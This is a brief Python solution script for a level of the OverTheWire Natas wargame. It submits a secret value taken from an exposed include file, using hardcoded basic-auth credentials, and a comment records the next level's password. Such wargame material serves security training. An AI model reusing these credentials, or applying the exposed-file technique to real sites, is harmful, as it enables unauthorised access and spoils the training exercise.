import requests

# open url/secret.inc and copy the secret
url = "http://natas6.natas.labs.overthewire.org/index.php"

secret= "FOEIUWGHFEEUHOFUOIU"

s = requests.Session()
s.auth = ('natas6', 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
data = (("secret", secret), ("submit", ""))
r = s.post(url, data=data)

print(r.text)

# 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9